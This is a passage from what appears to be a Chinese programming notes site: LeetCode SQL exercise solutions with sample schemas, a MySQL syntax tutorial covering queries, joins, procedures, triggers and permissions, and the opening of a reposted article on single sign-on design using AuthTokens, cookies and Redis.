varchar | | State | varchar | +-------------+---------+ AddressId is the primary key column for this table. 查找 FirstName, LastName, City, State 数据，而不管一个用户有没有填地址信息。\nSolution    涉及到 Person 和 Address 两个表，在对这两个表执行连接操作时，因为要保留 Person 表中的信息，即使在 Address 表中没有关联的信息也要保留。此时可以用左外连接，将 Person 表放在 LEFT JOIN 的左边。\nSELECT FirstName, LastName, City, State FROM Person P LEFT JOIN Address A ON P.PersonId = A.PersonId; SQL Schema    DROP TABLE IF EXISTS Person; CREATE TABLE Person ( PersonId INT, FirstName VARCHAR ( 255 ), LastName VARCHAR ( 255 ) ); DROP TABLE IF EXISTS Address; CREATE TABLE Address ( AddressId INT, PersonId INT, City VARCHAR ( 255 ), State VARCHAR ( 255 ) ); INSERT INTO Person ( PersonId, LastName, FirstName ) VALUES ( 1, \u0026#39;Wang\u0026#39;, \u0026#39;Allen\u0026#39; ); INSERT INTO Address ( AddressId, PersonId, City, State ) VALUES ( 1, 2, \u0026#39;New York City\u0026#39;, \u0026#39;New York\u0026#39; ); 181. Employees Earning More Than Their Managers    https://leetcode.com/problems/employees-earning-more-than-their-managers/description/\nDescription    Employee 表：\n+----+-------+--------+-----------+ | Id | Name | Salary | ManagerId | +----+-------+--------+-----------+ | 1 | Joe | 70000 | 3 | | 2 | Henry | 80000 | 4 | | 3 | Sam | 60000 | NULL | | 4 | Max | 90000 | NULL | +----+-------+--------+-----------+ 查找薪资大于其经理薪资的员工信息。\nSolution    SELECT E1.NAME AS Employee FROM Employee E1 INNER JOIN Employee E2 ON E1.ManagerId = E2.Id AND E1.Salary \u0026gt; E2.Salary; SQL Schema    DROP TABLE IF EXISTS Employee; CREATE TABLE Employee ( Id INT, NAME VARCHAR ( 255 ), Salary INT, ManagerId INT ); INSERT INTO Employee ( Id, NAME, Salary, ManagerId ) VALUES ( 1, \u0026#39;Joe\u0026#39;, 70000, 3 ), ( 2, \u0026#39;Henry\u0026#39;, 80000, 4 ), ( 3, \u0026#39;Sam\u0026#39;, 60000, NULL ), ( 4, \u0026#39;Max\u0026#39;, 90000, NULL ); 183. Customers Who Never Order    https://leetcode.com/problems/customers-who-never-order/description/\nDescription    Customers 表：\n+----+-------+ | Id | Name | +----+-------+ | 1 | Joe | | 2 | Henry | | 3 | Sam | | 4 | Max | +----+-------+ Orders 表：\n+----+------------+ | Id | CustomerId | +----+------------+ | 1 | 3 | | 2 | 1 | +----+------------+ 查找没有订单的顾客信息：\n+-----------+ | Customers | +-----------+ | Henry | | Max | +-----------+ Solution    左外链接\nSELECT C.Name AS Customers FROM Customers C LEFT JOIN Orders O ON C.Id = O.CustomerId WHERE O.CustomerId IS NULL; 子查询\nSELECT Name AS Customers FROM Customers WHERE Id NOT IN ( SELECT CustomerId FROM Orders ); SQL Schema    DROP TABLE IF EXISTS Customers; CREATE TABLE Customers ( Id INT, NAME VARCHAR ( 255 ) ); DROP TABLE IF EXISTS Orders; CREATE TABLE Orders ( Id INT, CustomerId INT ); INSERT INTO Customers ( Id, NAME ) VALUES ( 1, \u0026#39;Joe\u0026#39; ), ( 2, \u0026#39;Henry\u0026#39; ), ( 3, \u0026#39;Sam\u0026#39; ), ( 4, \u0026#39;Max\u0026#39; ); INSERT INTO Orders ( Id, CustomerId ) VALUES ( 1, 3 ), ( 2, 1 ); 184. Department Highest Salary    https://leetcode.com/problems/department-highest-salary/description/\nDescription    Employee 表：\n+----+-------+--------+--------------+ | Id | Name | Salary | DepartmentId | +----+-------+--------+--------------+ | 1 | Joe | 70000 | 1 | | 2 | Henry | 80000 | 2 | | 3 | Sam | 60000 | 2 | | 4 | Max | 90000 | 1 | +----+-------+--------+--------------+ Department 表：\n+----+----------+ | Id | Name | +----+----------+ | 1 | IT | | 2 | Sales | +----+----------+ 查找一个 Department 中收入最高者的信息：\n+------------+----------+--------+ | Department | Employee | Salary | +------------+----------+--------+ | IT | Max | 90000 | | Sales | Henry | 80000 | +------------+----------+--------+ Solution    创建一个临时表，包含了部门员工的最大薪资。可以对部门进行分组，然后使用 MAX() 汇总函数取得最大薪资。\n之后使用连接找到一个部门中薪资等于临时表中最大薪资的员工。\nSELECT D.NAME Department, E.NAME Employee, E.Salary FROM Employee E, Department D, ( SELECT DepartmentId, MAX( Salary ) Salary FROM Employee GROUP BY DepartmentId ) M WHERE E.DepartmentId = D.Id AND E.DepartmentId = M.DepartmentId AND E.Salary = M.Salary; SQL Schema    DROP TABLE IF EXISTS Employee; CREATE TABLE Employee ( Id INT, NAME VARCHAR ( 255 ), Salary INT, DepartmentId INT ); DROP TABLE IF EXISTS Department; CREATE TABLE Department ( Id INT, NAME VARCHAR ( 255 ) ); INSERT INTO Employee ( Id, NAME, Salary, DepartmentId ) VALUES ( 1, \u0026#39;Joe\u0026#39;, 70000, 1 ), ( 2, \u0026#39;Henry\u0026#39;, 80000, 2 ), ( 3, \u0026#39;Sam\u0026#39;, 60000, 2 ), ( 4, \u0026#39;Max\u0026#39;, 90000, 1 ); INSERT INTO Department ( Id, NAME ) VALUES ( 1, \u0026#39;IT\u0026#39; ), ( 2, \u0026#39;Sales\u0026#39; ); 176. Second Highest Salary    https://leetcode.com/problems/second-highest-salary/description/\nDescription    +----+--------+ | Id | Salary | +----+--------+ | 1 | 100 | | 2 | 200 | | 3 | 300 | +----+--------+ 查找工资第二高的员工。\n+---------------------+ | SecondHighestSalary | +---------------------+ | 200 | +---------------------+ 没有找到返回 null 而不是不返回数据。\nSolution    为了在没有查找到数据时返回 null，需要在查询结果外面再套一层 SELECT。\nSELECT ( SELECT DISTINCT Salary FROM Employee ORDER BY Salary DESC LIMIT 1, 1 ) SecondHighestSalary; SQL Schema    DROP TABLE IF EXISTS Employee; CREATE TABLE Employee ( Id INT, Salary INT ); INSERT INTO Employee ( Id, Salary ) VALUES ( 1, 100 ), ( 2, 200 ), ( 3, 300 ); 177. Nth Highest Salary    Description    查找工资第 N 高的员工。\nSolution    CREATE FUNCTION getNthHighestSalary ( N INT ) RETURNS INT BEGIN SET N = N - 1; RETURN ( SELECT ( SELECT DISTINCT Salary FROM Employee ORDER BY Salary DESC LIMIT N, 1 ) ); END SQL Schema    同 176。\n178. Rank Scores    https://leetcode.com/problems/rank-scores/description/\nDescription    得分表：\n+----+-------+ | Id | Score | +----+-------+ | 1 | 3.50 | | 2 | 3.65 | | 3 | 4.00 | | 4 | 3.85 | | 5 | 4.00 | | 6 | 3.65 | +----+-------+ 将得分排序，并统计排名。\n+-------+------+ | Score | Rank | +-------+------+ | 4.00 | 1 | | 4.00 | 1 | | 3.85 | 2 | | 3.65 | 3 | | 3.65 | 3 | | 3.50 | 4 | +-------+------+ Solution    要统计某个 score 的排名，只要统计大于等于该 score 的 score 数量。\n   Id score 大于等于该 score 的 score 数量 排名     1 4.1 3 3   2 4.2 2 2   3 4.3 1 1    使用连接操作找到某个 score 对应的大于等于其值的记录：\nSELECT * FROM Scores S1 INNER JOIN Scores S2 ON S1.score \u0026lt;= S2.score ORDER BY S1.score DESC, S1.Id;    S1.Id S1.score S2.Id S2.score     3 4.3 3 4.3   2 4.2 2 4.2   2 4.2 3 4.3   1 4.1 1 4.1   1 4.1 2 4.2   1 4.1 3 4.3    可以看到每个 S1.score 都有对应好几条记录，我们再进行分组，并统计每个分组的数量作为 \u0026lsquo;Rank\u0026rsquo;\nSELECT S1.score \u0026#39;Score\u0026#39;, COUNT(*) \u0026#39;Rank\u0026#39; FROM Scores S1 INNER JOIN Scores S2 ON S1.score \u0026lt;= S2.score GROUP BY S1.id, S1.score ORDER BY S1.score DESC, S1.Id;    score Rank     4.3 1   4.2 2   4.1 3    上面的解法看似没问题，但是对于以下数据，它却得到了错误的结果：\n   Id score     1 4.1   2 4.2   3 4.2       score Rank     4.2 2   4.2 2   4.1 3    而我们希望的结果为：\n   score Rank     4.2 1   4.2 1   4.1 2    连接情况如下：\n   S1.Id S1.score S2.Id S2.score     2 4.2 3 4.2   2 4.2 2 4.2   3 4.2 3 4.2   3 4.2 2 4.1   1 4.1 3 4.2   1 4.1 2 4.2   1 4.1 1 4.1    我们想要的结果是，把分数相同的放在同一个排名，并且相同分数只占一个位置，例如上面的分数，Id=2 和 Id=3 的记录都有相同的分数，并且最高，他们并列第一。而 Id=1 的记录应该排第二名，而不是第三名。所以在进行 COUNT 计数统计时，我们需要使用 COUNT( DISTINCT S2.score ) 从而只统计一次相同的分数。\nSELECT S1.score \u0026#39;Score\u0026#39;, COUNT( DISTINCT S2.score ) \u0026#39;Rank\u0026#39; FROM Scores S1 INNER JOIN Scores S2 ON S1.score \u0026lt;= S2.score GROUP BY S1.id, S1.score ORDER BY S1.score DESC; SQL Schema    DROP TABLE IF EXISTS Scores; CREATE TABLE Scores ( Id INT, Score DECIMAL ( 3, 2 ) ); INSERT INTO Scores ( Id, Score ) VALUES ( 1, 4.1 ), ( 2, 4.1 ), ( 3, 4.2 ), ( 4, 4.2 ), ( 5, 4.3 ), ( 6, 4.3 ); 180. Consecutive Numbers    https://leetcode.com/problems/consecutive-numbers/description/\nDescription    数字表：\n+----+-----+ | Id | Num | +----+-----+ | 1 | 1 | | 2 | 1 | | 3 | 1 | | 4 | 2 | | 5 | 1 | | 6 | 2 | | 7 | 2 | +----+-----+ 查找连续出现三次的数字。\n+-----------------+ | ConsecutiveNums | +-----------------+ | 1 | +-----------------+ Solution    SELECT DISTINCT L1.num ConsecutiveNums FROM Logs L1, Logs L2, Logs L3 WHERE L1.id = l2.id - 1 AND L2.id = L3.id - 1 AND L1.num = L2.num AND l2.num = l3.num; SQL Schema    DROP TABLE IF EXISTS LOGS; CREATE TABLE LOGS ( Id INT, Num INT ); INSERT INTO LOGS ( Id, Num ) VALUES ( 1, 1 ), ( 2, 1 ), ( 3, 1 ), ( 4, 2 ), ( 5, 1 ), ( 6, 2 ), ( 7, 2 ); 626. Exchange Seats    https://leetcode.com/problems/exchange-seats/description/\nDescription    seat 表存储着座位对应的学生。\n+---------+---------+ | id | student | +---------+---------+ | 1 | Abbot | | 2 | Doris | | 3 | Emerson | | 4 | Green | | 5 | Jeames | +---------+---------+ 要求交换相邻座位的两个学生，如果最后一个座位是奇数，那么不交换这个座位上的学生。\n+---------+---------+ | id | student | +---------+---------+ | 1 | Doris | | 2 | Abbot | | 3 | Green | | 4 | Emerson | | 5 | Jeames | +---------+---------+ Solution    使用多个 union。\n## 处理偶数 id，让 id 减 1 ## 例如 2,4,6,... 变成 1,3,5,... SELECT s1.id - 1 AS id, s1.student FROM seat s1 WHERE s1.id MOD 2 = 0 UNION ## 处理奇数 id，让 id 加 1。但是如果最大的 id 为奇数，则不做处理 ## 例如 1,3,5,... 变成 2,4,6,... SELECT s2.id + 1 AS id, s2.student FROM seat s2 WHERE s2.id MOD 2 = 1 AND s2.id != ( SELECT max( s3.id ) FROM seat s3 ) UNION ## 如果最大的 id 为奇数，单独取出这个数 SELECT s4.id AS id, s4.student FROM seat s4 WHERE s4.id MOD 2 = 1 AND s4.id = ( SELECT max( s5.id ) FROM seat s5 ) ORDER BY id; SQL Schema    DROP TABLE IF EXISTS seat; CREATE TABLE seat ( id INT, student VARCHAR ( 255 ) ); INSERT INTO seat ( id, student ) VALUES ( \u0026#39;1\u0026#39;, \u0026#39;Abbot\u0026#39; ), ( \u0026#39;2\u0026#39;, \u0026#39;Doris\u0026#39; ), ( \u0026#39;3\u0026#39;, \u0026#39;Emerson\u0026#39; ), ( \u0026#39;4\u0026#39;, \u0026#39;Green\u0026#39; ), ( \u0026#39;5\u0026#39;, \u0026#39;Jeames\u0026#39; ); "},{"id":309,"href":"/%E7%AC%94%E8%AE%B0/SQLSQL-%E8%AF%AD%E6%B3%95/","title":"SQL 语法","parent":"笔记","content":"SQL 语法     SQL 语法  一、基础 二、创建表 三、修改表 四、插入 五、更新 六、删除 七、查询  DISTINCT LIMIT   八、排序 九、过滤 十、通配符 十一、计算字段 十二、函数  汇总 文本处理 日期和时间处理 数值处理   十三、分组 十四、子查询 十五、连接  内连接 自连接 自然连接 外连接   十六、组合查询 十七、视图 十八、存储过程 十九、游标 二十、触发器 二十一、事务管理 二十二、字符集 二十三、权限管理 参考资料    一、基础    模式定义了数据如何存储、存储什么样的数据以及数据如何分解等信息，数据库和表都有模式。\n主键的值不允许修改，也不允许复用（不能将已经删除的主键值赋给新数据行的主键）。\nSQL（Structured Query Language)，标准 SQL 由 ANSI 标准委员会管理，从而称为 ANSI SQL。各个 DBMS 都有自己的实现，如 PL/SQL、Transact-SQL 等。\nSQL 语句不区分大小写，但是数据库表名、列名和值是否区分依赖于具体的 DBMS 以及配置。\nSQL 支持以下三种注释：\n## 注释 SELECT * FROM mytable; -- 注释 /* 注释1 注释2 */ 数据库创建与使用：\nCREATE DATABASE test; USE test; 二、创建表    CREATE TABLE mytable ( # int 类型，不为空，自增 id INT NOT NULL AUTO_INCREMENT, # int 类型，不可为空，默认值为 1，不为空 col1 INT NOT NULL DEFAULT 1, # 变长字符串类型，最长为 45 个字符，可以为空 col2 VARCHAR(45) NULL, # 日期类型，可为空 col3 DATE NULL, # 设置主键为 id PRIMARY KEY (`id`)); 三、修改表    添加列\nALTER TABLE mytable ADD col CHAR(20); 删除列\nALTER TABLE mytable DROP COLUMN col; 删除表\nDROP TABLE mytable; 四、插入    普通插入\nINSERT INTO mytable(col1, col2) VALUES(val1, val2); 插入检索出来的数据\nINSERT INTO mytable1(col1, col2) SELECT col1, col2 FROM mytable2; 将一个表的内容插入到一个新表\nCREATE TABLE newtable AS SELECT * FROM mytable; 五、更新    UPDATE mytable SET col = val WHERE id = 1; 六、删除    DELETE FROM mytable WHERE id = 1; TRUNCATE TABLE 可以清空表，也就是删除所有行。\nTRUNCATE TABLE mytable; 使用更新和删除操作时一定要用 WHERE 子句，不然会把整张表的数据都破坏。可以先用 SELECT 语句进行测试，防止错误删除。\n七、查询    DISTINCT    相同值只会出现一次。它作用于所有列，也就是说所有列的值都相同才算相同。\nSELECT DISTINCT col1, col2 FROM mytable; LIMIT    限制返回的行数。可以有两个参数，第一个参数为起始行，从 0 开始；第二个参数为返回的总行数。\n返回前 5 行：\nSELECT * FROM mytable LIMIT 5; SELECT * FROM mytable LIMIT 0, 5; 返回第 3 ~ 5 行：\nSELECT * FROM mytable LIMIT 2, 3; 八、排序     ASC ：升序（默认） DESC ：降序  可以按多个列进行排序，并且为每个列指定不同的排序方式：\nSELECT * FROM mytable ORDER BY col1 DESC, col2 ASC; 九、过滤    不进行过滤的数据非常大，导致通过网络传输了多余的数据，从而浪费了网络带宽。因此尽量使用 SQL 语句来过滤不必要的数据，而不是传输所有的数据到客户端中然后由客户端进行过滤。\nSELECT * FROM mytable WHERE col IS NULL; 下表显示了 WHERE 子句可用的操作符\n   操作符 说明     = 等于   \u0026lt; 小于   \u0026gt; 大于   \u0026lt;\u0026gt; != 不等于   \u0026lt;= !\u0026gt; 小于等于   \u0026gt;= !\u0026lt; 大于等于   BETWEEN 在两个值之间   IS NULL 为 NULL 值    应该注意到，NULL 与 0、空字符串都不同。\nAND 和 OR 用于连接多个过滤条件。优先处理 AND，当一个过滤表达式涉及到多个 AND 和 OR 时，可以使用 () 来决定优先级，使得优先级关系更清晰。\nIN 操作符用于匹配一组值，其后也可以接一个 SELECT 子句，从而匹配子查询得到的一组值。\nNOT 操作符用于否定一个条件。\n十、通配符    通配符也是用在过滤语句中，但它只能用于文本字段。\n  % 匹配 \u0026gt;=0 个任意字符；\n  _ 匹配 ==1 个任意字符；\n   可以匹配集合内的字符，例如 [ab] 将匹配字符 a 或者 b。用脱字符 ^ 可以对其进行否定，也就是不匹配集合内的字符。\n  使用 Like 来进行通配符匹配。\nSELECT * FROM mytable WHERE col LIKE \u0026#39;[^AB]%\u0026#39;; -- 不以 A 和 B 开头的任意文本 不要滥用通配符，通配符位于开头处匹配会非常慢。\n十一、计算字段    在数据库服务器上完成数据的转换和格式化的工作往往比客户端上快得多，并且转换和格式化后的数据量更少的话可以减少网络通信量。\n计算字段通常需要使用 AS 来取别名，否则输出的时候字段名为计算表达式。\nSELECT col1 * col2 AS alias FROM mytable; CONCAT() 用于连接两个字段。许多数据库会使用空格把一个值填充为列宽，因此连接的结果会出现一些不必要的空格，使用 TRIM() 可以去除首尾空格。\nSELECT CONCAT(TRIM(col1), \u0026#39;(\u0026#39;, TRIM(col2), \u0026#39;)\u0026#39;) AS concat_col FROM mytable; 十二、函数    各个 DBMS 的函数都是不相同的，因此不可移植，以下主要是 MySQL 的函数。\n汇总       函 数 说 明     AVG() 返回某列的平均值   COUNT() 返回某列的行数   MAX() 返回某列的最大值   MIN() 返回某列的最小值   SUM() 返回某列值之和    AVG() 会忽略 NULL 行。\n使用 DISTINCT 可以汇总不同的值。\nSELECT AVG(DISTINCT col1) AS avg_col FROM mytable; 文本处理       函数 说明     LEFT() 左边的字符   RIGHT() 右边的字符   LOWER() 转换为小写字符   UPPER() 转换为大写字符   LTRIM() 去除左边的空格   RTRIM() 去除右边的空格   LENGTH() 长度   SOUNDEX() 转换为语音值    其中， SOUNDEX() 可以将一个字符串转换为描述其语音表示的字母数字模式。\nSELECT * FROM mytable WHERE SOUNDEX(col1) = SOUNDEX(\u0026#39;apple\u0026#39;) 日期和时间处理     日期格式：YYYY-MM-DD 时间格式：HH:\u0026lt;zero-width space\u0026gt;MM:SS     函 数 说 明     ADDDATE() 增加一个日期（天、周等）   ADDTIME() 增加一个时间（时、分等）   CURDATE() 返回当前日期   CURTIME() 返回当前时间   DATE() 返回日期时间的日期部分   DATEDIFF() 计算两个日期之差   DATE_ADD() 高度灵活的日期运算函数   DATE_FORMAT() 返回一个格式化的日期或时间串   DAY() 返回一个日期的天数部分   DAYOFWEEK() 对于一个日期，返回对应的星期几   HOUR() 返回一个时间的小时部分   MINUTE() 返回一个时间的分钟部分   MONTH() 返回一个日期的月份部分   NOW() 返回当前日期和时间   SECOND() 返回一个时间的秒部分   TIME() 返回一个日期时间的时间部分   YEAR() 返回一个日期的年份部分    mysql\u0026gt; SELECT NOW(); 2018-4-14 20:25:11 数值处理       函数 说明     SIN() 正弦   COS() 余弦   TAN() 正切   ABS() 绝对值   SQRT() 平方根   MOD() 余数   EXP() 指数   PI() 圆周率   RAND() 随机数    十三、分组    把具有相同的数据值的行放在同一组中。\n可以对同一分组数据使用汇总函数进行处理，例如求分组数据的平均值等。\n指定的分组字段除了能按该字段进行分组，也会自动按该字段进行排序。\nSELECT col, COUNT(*) AS num FROM mytable GROUP BY col; GROUP BY 自动按分组字段进行排序，ORDER BY 也可以按汇总字段来进行排序。\nSELECT col, COUNT(*) AS num FROM mytable GROUP BY col ORDER BY num; WHERE 过滤行，HAVING 过滤分组，行过滤应当先于分组过滤。\nSELECT col, COUNT(*) AS num FROM mytable WHERE col \u0026gt; 2 GROUP BY col HAVING num \u0026gt;= 2; 分组规定：\n GROUP BY 子句出现在 WHERE 子句之后，ORDER BY 子句之前； 除了汇总字段外，SELECT 语句中的每一字段都必须在 GROUP BY 子句中给出； NULL 的行会单独分为一组； 大多数 SQL 实现不支持 GROUP BY 列具有可变长度的数据类型。  十四、子查询    子查询中只能返回一个字段的数据。\n可以将子查询的结果作为 WHRER 语句的过滤条件：\nSELECT * FROM mytable1 WHERE col1 IN (SELECT col2 FROM mytable2); 下面的语句可以检索出客户的订单数量，子查询语句会对第一个查询检索出的每个客户执行一次：\nSELECT cust_name, (SELECT COUNT(*) FROM Orders WHERE Orders.cust_id = Customers.cust_id) AS orders_num FROM Customers ORDER BY cust_name; 十五、连接    连接用于连接多个表，使用 JOIN 关键字，并且条件语句使用 ON 而不是 WHERE。\n连接可以替换子查询，并且比子查询的效率一般会更快。\n可以用 AS 给列名、计算字段和表名取别名，给表名取别名是为了简化 SQL 语句以及连接相同表。\n内连接    内连接又称等值连接，使用 INNER JOIN 关键字。\nSELECT A.value, B.value FROM tablea AS A INNER JOIN tableb AS B ON A.key = B.key; 可以不明确使用 INNER JOIN，而使用普通查询并在 WHERE 中将两个表中要连接的列用等值方法连接起来。\nSELECT A.value, B.value FROM tablea AS A, tableb AS B WHERE A.key = B.key; 自连接    自连接可以看成内连接的一种，只是连接的表是自身而已。\n一张员工表，包含员工姓名和员工所属部门，要找出与 Jim 处在同一部门的所有员工姓名。\n子查询版本\nSELECT name FROM employee WHERE department = ( SELECT department FROM employee WHERE name = \u0026#34;Jim\u0026#34;); 自连接版本\nSELECT e1.name FROM employee AS e1 INNER JOIN employee AS e2 ON e1.department = e2.department AND e2.name = \u0026#34;Jim\u0026#34;; 自然连接    自然连接是把同名列通过等值测试连接起来的，同名列可以有多个。\n内连接和自然连接的区别：内连接提供连接的列，而自然连接自动连接所有同名列。\nSELECT A.value, B.value FROM tablea AS A NATURAL JOIN tableb AS B; 外连接    外连接保留了没有关联的那些行。分为左外连接，右外连接以及全外连接，左外连接就是保留左表没有关联的行。\n检索所有顾客的订单信息，包括还没有订单信息的顾客。\nSELECT Customers.cust_id, Customer.cust_name, Orders.order_id FROM Customers LEFT OUTER JOIN Orders ON Customers.cust_id = Orders.cust_id; customers 表：\n   cust_id cust_name     1 a   2 b   3 c    orders 表：\n   order_id cust_id     1 1   2 1   3 3   4 3    结果：\n   cust_id cust_name order_id     1 a 1   1 a 2   3 c 3   3 c 4   2 b Null    十六、组合查询    使用 UNION 来组合两个查询，如果第一个查询返回 M 行，第二个查询返回 N 行，那么组合查询的结果一般为 M+N 行。\n每个查询必须包含相同的列、表达式和聚集函数。\n默认会去除相同行，如果需要保留相同行，使用 UNION ALL。\n只能包含一个 ORDER BY 子句，并且必须位于语句的最后。\nSELECT col FROM mytable WHERE col = 1 UNION SELECT col FROM mytable WHERE col =2; 十七、视图    视图是虚拟的表，本身不包含数据，也就不能对其进行索引操作。\n对视图的操作和对普通表的操作一样。\n视图具有如下好处：\n 简化复杂的 SQL 操作，比如复杂的连接； 只使用实际表的一部分数据； 通过只给用户访问视图的权限，保证数据的安全性； 更改数据格式和表示。  CREATE VIEW myview AS SELECT Concat(col1, col2) AS concat_col, col3*col4 AS compute_col FROM mytable WHERE col5 = val; 十八、存储过程    存储过程可以看成是对一系列 SQL 操作的批处理。\n使用存储过程的好处：\n 代码封装，保证了一定的安全性； 代码复用； 由于是预先编译，因此具有很高的性能。  命令行中创建存储过程需要自定义分隔符，因为命令行是以 ; 为结束符，而存储过程中也包含了分号，因此会错误把这部分分号当成是结束符，造成语法错误。\n包含 in、out 和 inout 三种参数。\n给变量赋值都需要用 select into 语句。\n每次只能给一个变量赋值，不支持集合的操作。\ndelimiter // create procedure myprocedure( out ret int ) begin declare y int; select sum(col1) from mytable into y; select y*y into ret; end // delimiter ; call myprocedure(@ret); select @ret; 十九、游标    在存储过程中使用游标可以对一个结果集进行移动遍历。\n游标主要用于交互式应用，其中用户需要对数据集中的任意行进行浏览和修改。\n使用游标的四个步骤：\n 声明游标，这个过程没有实际检索出数据； 打开游标； 取出数据； 关闭游标；  delimiter // create procedure myprocedure(out ret int) begin declare done boolean default 0; declare mycursor cursor for select col1 from mytable; # 定义了一个 continue handler，当 sqlstate \u0026#39;02000\u0026#39; 这个条件出现时，会执行 set done = 1 declare continue handler for sqlstate \u0026#39;02000\u0026#39; set done = 1; open mycursor; repeat fetch mycursor into ret; select ret; until done end repeat; close mycursor; end // delimiter ; 二十、触发器    触发器会在某个表执行以下语句时而自动执行：DELETE、INSERT、UPDATE。\n触发器必须指定在语句执行之前还是之后自动执行，之前执行使用 BEFORE 关键字，之后执行使用 AFTER 关键字。BEFORE 用于数据验证和净化，AFTER 用于审计跟踪，将修改记录到另外一张表中。\nINSERT 触发器包含一个名为 NEW 的虚拟表。\nCREATE TRIGGER mytrigger AFTER INSERT ON mytable FOR EACH ROW SELECT NEW.col into @result; SELECT @result; -- 获取结果 DELETE 触发器包含一个名为 OLD 的虚拟表，并且是只读的。\nUPDATE 触发器包含一个名为 NEW 和一个名为 OLD 的虚拟表，其中 NEW 是可以被修改的，而 OLD 是只读的。\nMySQL 不允许在触发器中使用 CALL 语句，也就是不能调用存储过程。\n二十一、事务管理    基本术语：\n 事务（transaction）指一组 SQL 语句； 回退（rollback）指撤销指定 SQL 语句的过程； 提交（commit）指将未存储的 SQL 语句结果写入数据库表； 保留点（savepoint）指事务处理中设置的临时占位符（placeholder），你可以对它发布回退（与回退整个事务处理不同）。  不能回退 SELECT 语句，回退 SELECT 语句也没意义；也不能回退 CREATE 和 DROP 语句。\nMySQL 的事务提交默认是隐式提交，每执行一条语句就把这条语句当成一个事务然后进行提交。当出现 START TRANSACTION 语句时，会关闭隐式提交；当 COMMIT 或 ROLLBACK 语句执行后，事务会自动关闭，重新恢复隐式提交。\n设置 autocommit 为 0 可以取消自动提交；autocommit 标记是针对每个连接而不是针对服务器的。\n如果没有设置保留点，ROLLBACK 会回退到 START TRANSACTION 语句处；如果设置了保留点，并且在 ROLLBACK 中指定该保留点，则会回退到该保留点。\nSTART TRANSACTION // ... SAVEPOINT delete1 // ... ROLLBACK TO delete1 // ... COMMIT 二十二、字符集    基本术语：\n 字符集为字母和符号的集合； 编码为某个字符集成员的内部表示； 校对字符指定如何比较，主要用于排序和分组。  除了给表指定字符集和校对外，也可以给列指定：\nCREATE TABLE mytable (col VARCHAR(10) CHARACTER SET latin COLLATE latin1_general_ci ) DEFAULT CHARACTER SET hebrew COLLATE hebrew_general_ci; 可以在排序、分组时指定校对：\nSELECT * FROM mytable ORDER BY col COLLATE latin1_general_ci; 二十三、权限管理    MySQL 的账户信息保存在 mysql 这个数据库中。\nUSE mysql; SELECT user FROM user; 创建账户\n新创建的账户没有任何权限。\nCREATE USER myuser IDENTIFIED BY \u0026#39;mypassword\u0026#39;; 修改账户名\nRENAME USER myuser TO newuser; 删除账户\nDROP USER myuser; 查看权限\nSHOW GRANTS FOR myuser; 授予权限\n账户用 username@host 的形式定义，username@% 使用的是默认主机名。\nGRANT SELECT, INSERT ON mydatabase.* TO myuser; 删除权限\nGRANT 和 REVOKE 可在几个层次上控制访问权限：\n 整个服务器，使用 GRANT ALL 和 REVOKE ALL； 整个数据库，使用 ON database.*； 特定的表，使用 ON database.table； 特定的列； 特定的存储过程。  REVOKE SELECT, INSERT ON mydatabase.* FROM myuser; 更改密码\n必须使用 Password() 函数进行加密。\nSET PASSWROD FOR myuser = Password(\u0026#39;new_password\u0026#39;); 参考资料     BenForta. SQL 必知必会 [M]. 人民邮电出版社, 2013.  "},{"id":310,"href":"/system-design/authority-certification/SSO%E5%8D%95%E7%82%B9%E7%99%BB%E5%BD%95%E7%9C%8B%E8%BF%99%E4%B8%80%E7%AF%87%E5%B0%B1%E5%A4%9F%E4%BA%86/","title":"SSO单点登录看这一篇就够了","parent":"authority-certification","content":" 本文授权转载自 ： https://ken.io/note/sso-design-implement 作者：ken.io\n相关推荐阅读：系统的讲解 - SSO单点登录\n 一、前言    1、SSO说明    SSO英文全称Single Sign On，单点登录。SSO是在多个应用系统中，用户只需要登录一次就可以访问所有相互信任的应用系统。https://baike.baidu.com/item/SSO/3451380\n例如访问在网易账号中心（https://reg.163.com/ ）登录之后 访问以下站点都是登录状态\n 网易直播 https://v.163.com 网易博客 https://blog.163.com 网易花田 https://love.163.com 网易考拉 https://www.kaola.com 网易Lofter http://www.lofter.com  2、单点登录系统的好处     用户角度 :用户能够做到一次登录多次使用，无需记录多套用户名和密码，省心。 系统管理员角度 : 管理员只需维护好一个统一的账号中心就可以了，方便。 新系统开发角度: 新系统开发时只需直接对接统一的账号中心即可，简化开发流程，省时。  3、设计目标    本篇文章也主要是为了探讨如何设计\u0026amp;实现一个SSO系统\n以下为需要实现的核心功能：\n 单点登录 单点登出 支持跨域单点登录 支持跨域单点登出  二、SSO设计与实现    1、核心应用与依赖       应用/模块/对象 说明     前台站点 需要登录的站点   SSO站点-登录 提供登录的页面   SSO站点-登出 提供注销登录的入口   SSO服务-登录 提供登录服务   SSO服务-登录状态 提供登录状态校验/登录信息查询的服务   SSO服务-登出 提供用户注销登录的服务   数据库 存储用户账户信息   缓存 存储用户的登录信息，通常使用Redis    2、用户登录状态的存储与校验    常见的Web框架对于Session的实现都是生成一个SessionId存储在浏览器Cookie中。然后将Session内容存储在服务器端内存中，这个 ken.io 在之前Session工作原理中也提到过。整体也是借鉴这个思路。 用户登录成功之后，生成AuthToken交给客户端保存。如果是浏览器，就保存在Cookie中。如果是手机App就保存在App本地缓存中。本篇主要探讨基于Web站点的SSO。 用户在浏览需要登录的页面时，客户端将AuthToken提交给SSO服务校验登录状态/获取用户登录信息\n对于登录信息的存储，建议采用Redis，使用Redis集群来存储登录信息，既可以保证高可用，又可以线性扩充。同时也可以让SSO服务满足负载均衡/可伸缩的需求。\n   对象 说明     AuthToken 直接使用UUID/GUID即可，如果有验证AuthToken合法性需求，可以将UserName+时间戳加密生成，服务端解密之后验证合法性   登录信息 通常是将UserId，UserName缓存起来    3、用户登录/登录校验     登录时序图  按照上图，用户登录后AuthToken保存在Cookie中。 domain=test.com 浏览器会将domain设置成 .test.com， 这样访问所有*.test.com的web站点，都会将AuthToken携带到服务器端。 然后通过SSO服务，完成对用户状态的校验/用户登录信息的获取\n 登录信息获取/登录状态校验  4、用户登出    用户登出时要做的事情很简单：\n 服务端清除缓存（Redis）中的登录状态 客户端清除存储的AuthToken   登出时序图  5、跨域登录、登出    前面提到过，核心思路是客户端存储AuthToken，服务器端通过Redis存储登录信息。由于客户端是将AuthToken存储在Cookie中的。所以跨域要解决的问题，就是如何解决Cookie的跨域读写问题。\n Cookie是不能跨域的 ，比如我一个\n 解决跨域的核心思路就是：\n 登录完成之后通过回调的方式，将AuthToken传递给主域名之外的站点，该站点自行将AuthToken保存在当前域下的Cookie中。 登出完成之后通过回调的方式，调用非主域名站点的登出页面，完成设置Cookie中的AuthToken过期的操作。 